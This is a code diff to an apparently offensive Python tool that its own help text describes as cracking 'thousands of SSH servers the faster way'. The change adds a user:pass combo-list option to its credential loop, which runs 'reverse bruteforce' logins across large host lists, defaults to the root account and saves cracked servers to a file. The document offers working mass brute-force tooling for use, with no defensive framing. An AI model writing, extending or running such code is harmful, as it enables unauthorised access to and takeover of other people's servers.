@@ -182,7 +182,8 @@ def main():
 
     parser = argparse.ArgumentParser(description="Modified version of https://github.com/lilmond/flasshbang, crack thousands of SSH servers the faster way.")
     parser.add_argument("-M", "--host-list", type=argparse.FileType("r"), required=True, help="By default, flasshbang2 requires multiple hostnames, up to a thousand is good. Use https://github.com/lilmond/Turbo to discover online hosts.")
-    parser.add_argument("-P", "--pass-list", type=argparse.FileType("r"), required=True, help="Path to password list.")
+    parser.add_argument("-P", "--pass-list", type=argparse.FileType("r"), help="Path to password list.")
+    parser.add_argument("-C", "--combo-list", type=argparse.FileType("r"), help="Path to combo list, format: user:pass")
     parser.add_argument("-o", "--output", type=argparse.FileType("a"), required=True, help="This is required since we'll be cracking thousands of servers at lightspeed.")
     parser.add_argument("-p", "--port", type=int, default=22, help="Port to connect to. Default is: 22")
     parser.add_argument("-u", "--username", type=str, default="root", help="Username to crack. Default is: root")
@@ -190,14 +191,44 @@ def main():
     
     args = parser.parse_args()
 
+    if not any([args.pass_list, args.combo_list]):
+        print("Error: either -P/--pass-list or -C/--combo-list is required")
+        return
+    
+    if all([args.pass_list, args.combo_list]):
+        print(f"Error: -P/--pass-list and -C/--combo-list cannot be used simultaneously")
+        return
+
     host_list = args.host_list.read().splitlines()
-    pass_list = args.pass_list.read().splitlines()
+
+    if args.pass_list:
+        pass_list = args.pass_list.read().splitlines()
+        creds_list = pass_list
+
+    if args.combo_list:
+        combo_list = args.combo_list.read().splitlines()
+
+        for line_num, combo in enumerate(combo_list, start=1):
+            try:
+                username, password = combo.split(":", 1)
+            except Exception:
+                print(f"Error: invalid combo format at line {line_num}: {combo}")
+                return
+        
+        creds_list = combo_list
+    
     output = args.output.name
     port = args.port
     username = args.username
     threads = args.threads
 
-    for password in pass_list:
+    for line in creds_list:
+        if args.combo_list:
+            username, password = line.split(":", 1)
+        else:
+            username = args.username
+            password = line
+            
         iterhosts = IterHostsLoginMethod(hostnames=host_list.copy(), port=port, username=username, password=password, output=output, threads=threads)
         print(f"Initializing reverse bruteforce on {len(host_list)} hosts")
         
